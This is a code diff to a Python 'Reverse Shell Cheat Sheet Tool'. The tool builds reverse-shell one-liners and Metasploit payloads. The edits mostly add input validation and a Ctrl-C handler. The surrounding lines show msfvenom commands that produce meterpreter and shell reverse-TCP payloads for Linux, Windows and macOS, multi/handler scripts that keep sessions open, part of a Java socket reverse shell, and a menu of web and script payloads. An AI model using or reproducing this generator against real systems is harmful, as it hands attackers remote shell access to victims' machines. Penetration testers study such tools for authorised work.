@@ -2,6 +2,12 @@
 import argparse, sys, os, re, socket, subprocess
 from urllib import request
 from random import choice
+import signal
+
+
+def signal_handler(sig, frame):
+    print('\nBye!')
+    sys.exit(1)
 
 
 def shell():
@@ -11,12 +17,22 @@ def shell():
     wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
     print(f'{choice(color)}For LAN enter 1: {lan}')
     print(f'{choice(color)}For WAN enter 2: {wan}')
-    cw = input("Which one do you want, LAN or WAN?: ")
-    if cw == '1':
-        ipp = lan
-    elif cw == '2':
-        ipp = wan
-    port = input("Select listening port: ")
+    while True:
+        cw = input('Which one do you want, LAN or WAN?: ')
+        if cw == '1':
+            ipp = lan
+            break
+        elif cw == '2':
+            ipp = wan
+            break
+        print('Invalid input.')
+    while True:
+        port = input("Select listening port: ")
+        try:
+            int(port)
+            break
+        except ValueError:
+            print('Invalid input.')
 
     # Keeping with the random colors, but adding color coding for different OS
     os_colors = {'windows': choice(color)}
@@ -154,17 +170,34 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 def payload():
     color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
 
-    ven = input("Enter Payload: ")
+    while True:
+        ven = input('Enter payload: ')
+        try:
+            if int(ven) < 1 or int(ven) > 15:
+                raise ValueError
+            break
+        except ValueError:
+            print('Invalid input.')
     lan = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('10.255.255.255', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0])
     wan = request.urlopen('https://api.ipify.org').readline().decode('utf-8')
     print(f'{choice(color)}For LAN enter 1: {lan}')
     print(f'{choice(color)}For WAN enter 2: {wan}')
-    cw = input("Which one do you want, LAN or WAN?: ")
-    if cw == '1':
-        ipp = lan
-    elif cw == '2':
-        ipp = wan
-    port = input("Select listening port: ")
+    while True:
+        cw = input('Which one do you want, LAN or WAN?: ')
+        if cw == '1':
+            ipp = lan
+            break
+        elif cw == '2':
+            ipp = wan
+            break
+        print('Invalid input.')
+    while True:
+        port = input('Select listening port: ')
+        try:
+            int(port)
+            break
+        except ValueError:
+            print('Invalid input.')
 
     msfpc_format = None
     msfvenom_rc = None
@@ -229,7 +262,7 @@ run -j""")
 
     #Shellcode
     if ven == '13':
-        dil = input("Enter language: ")
+        dil = input('Enter language: ')
         shell_file = f'linux-x86-meterpreter-reverse-tcp-{port}.{dil}'
         os.system(f'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
         print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
@@ -246,7 +279,7 @@ set ExitOnSession false
 set EnableStageEncoding true
 run -j""")
     if ven == '14':
-        dil = input("Enter language: ")
+        dil = input('Enter language: ')
         shell_file = f'windows-meterpreter-reverse-tcp-{port}.{dil}'
         os.system(f'msfvenom -p windows/meterpreter/reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
         print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
@@ -263,7 +296,7 @@ set ExitOnSession false
 set EnableStageEncoding true
 run -j""")
     if ven == '15':
-        dil = input("Enter language: ")
+        dil = input('Enter language: ')
         shell_file = f'osx-x86-shell-reverse-tcp-{port}.{dil}'
         os.system(f'msfvenom -p osx/x86/shell_reverse_tcp LHOST={ipp} LPORT={port} -f {dil} > "{shell_file}"')
         print(f'{dil} shellcode created: {os.getcwd()}/{shell_file}')
@@ -301,7 +334,7 @@ run -j""")
 def banner():
     color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
 
-    print(choice(color) + '''
+    print(choice(color) + """
                                     ╔═╗┬ ┬┌─┐╦  ╦ ╦  ╦┌─┐┬─┐
                                     ╚═╗├─┤├┤ ║  ║ ╚╗╔╝├┤ ├┬┘
                                     ╚═╝┴ ┴└─┘╩═╝╩═╝╚╝ └─┘┴└─
@@ -309,21 +342,21 @@ def banner():
                             .:: Reverse Shell Cheat Sheet Tool ::.
                                     .:: cyber-warrior.org ::.
                          .:: Heavily modified by Jonas A. Wendorf ::.
-''')
+""")
 
 
 def main(arg):
     color = ['\033[95m' , '\033[96m', '\033[36m' , '\033[94m' , '\033[92m' , '\033[93m' , '\033[91m']
 
     parser = argparse.ArgumentParser()
-    parser.add_argument("use", help="msf|shell")
+    parser.add_argument('use', help='msf|shell')
     args = parser.parse_args()
     banner()
-    if args.use == "shell":
+    if args.use == 'shell':
         shell()
-    elif args.use == "msf":
+    elif args.use == 'msf':
         print(choice(color) + """
-            ______________________________________________________________
+                    ______________________________________________________
 
                                 Creating Metasploit Payloads
          ______________________________________________________________________________
@@ -331,11 +364,11 @@ def main(arg):
         | #Binaries    |  #Web Payloads  |  #Scripting Payloads  |  #Shellcode         |
         |______________|_________________|_______________________|_____________________|
         |              |                 |                       |                     |
-        | 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux Based     |
+        | 1) Linux     | 4) PHP          | 9)  Python            | 13) Linux based     |
         |              |                 |                       |                     |
-        | 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows Based   |
+        | 2) Windows   | 5) ASP          | 10) Bash              | 14) Windows based   |
         |              |                 |                       |                     |
-        | 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac Based       |
+        | 3) Mac       | 6) JSP          | 11) Perl              | 15) Mac based       |
         |              |                 |                       |                     |
         |              | 7) WAR          | 12) Ruby              |                     |
         |              |                 |                       |                     |
@@ -343,10 +376,10 @@ def main(arg):
         |______________|_________________|_______________________|_____________________|
 """)
         payload()
-    elif args.use != "shell" and args.use != "msf":
+    elif args.use != 'shell' and args.use != 'msf':
         print(choice(color) + 'Type "python shell.py -h" or "shell -h" for options')
 
 
 if __name__ == '__main__':
-   main(sys.argv[1:])
-exit()
+    signal.signal(signal.SIGINT, signal_handler)
+    main(sys.argv[1:])
